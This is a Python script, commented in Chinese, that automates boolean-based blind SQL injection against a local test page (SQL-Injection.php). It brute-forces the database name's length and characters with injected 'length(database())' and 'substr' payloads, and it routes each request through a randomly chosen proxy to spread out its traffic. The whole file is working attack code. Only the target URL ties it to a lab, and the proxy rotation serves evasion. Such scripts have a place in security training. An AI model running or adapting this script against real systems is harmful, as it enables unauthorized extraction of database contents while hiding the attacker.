"""
布尔盲注爆破数据库名 - 带代理轮换功能
适用环境：本地 SQL-Injection.php 测试页面
判断依据：页面返回内容包含 "User:" 表示条件为真
"""

import string
import requests
import sys
import random

# 配置
TARGET_URL = "http://localhost/SQL-Injection.php"
TIMEOUT = 5
MAX_LENGTH = 20

# 代理列表（示例，请替换为实际可用代理）
PROXIES = [
    "http://proxy1.com:8080",
    "http://proxy2.com:8080",
    "http://proxy3.com:8080",
]

# 字符集
CHARSET = string.digits + string.ascii_letters + '_'

def get_random_proxy():
    """随机选择一个代理"""
    proxy = random.choice(PROXIES)
    return {"http": proxy, "https": proxy}

def make_request(payload):
    """发送请求（使用随机代理）"""
    params = {'id': payload}
    proxies = get_random_proxy()
    try:
        resp = requests.get(TARGET_URL, params=params, proxies=proxies, timeout=TIMEOUT)
        return resp.text
    except requests.RequestException as e:
        print(f"[!] 请求异常 (代理 {proxies['http']}): {e}")
        return None

def is_true(html):
    return html is not None and "User:" in html

def get_database_length():
    print("[*] 正在爆破数据库长度...")
    for length in range(1, MAX_LENGTH + 1):
        payload = f"1' and length(database())={length} -- -"
        if is_true(make_request(payload)):
            print(f"[+] 数据库长度: {length}")
            return length
    print("[-] 未找到数据库长度")
    sys.exit(1)

def get_database_name(length):
    print("[*] 正在爆破数据库名...")
    db_name = ""
    for pos in range(1, length + 1):
        found = False
        for ch in CHARSET:
            payload = f"1' and substr(database(),{pos},1)='{ch}' -- -"
            if is_true(make_request(payload)):
                db_name += ch
                print(f"[+] 第 {pos} 位: {ch}")
                found = True
                break
        if not found:
            print(f"[-] 第 {pos} 位未匹配到字符，置为 '?'")
            db_name += '?'
    return db_name

def main():
    print("=" * 50)
    print("布尔盲注 - 数据库名爆破 (带代理轮换)")
    print("=" * 50)
    length = get_database_length()
    name = get_database_name(length)
    print("\n" + "=" * 50)
    print(f"[最终结果] 数据库名: {name}")
    print("=" * 50)

if __name__ == "__main__":
    main()